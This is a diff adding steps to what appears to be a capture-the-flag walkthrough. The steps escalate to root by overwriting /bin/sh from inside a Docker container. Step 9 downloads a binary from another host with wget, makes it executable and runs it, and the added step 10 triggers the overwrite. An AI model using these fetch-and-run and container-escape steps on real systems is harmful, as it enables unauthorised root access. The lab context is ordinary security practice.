@@ -9,3 +9,6 @@
 7. exec docker sudo docker exec -it webapp-dev01 bash
 8. on local: python -m SimpleHTTPServer 80
 9. on docker: wget http://local:7777/main && chmod +x main && ./main
+10. while "[+] Overwritten /bin/sh successfully" message is present, open another SSH instance and execute: sudo docker exec -it webapp-dev01 /bin/sh
+
+Successfully got the root flag!
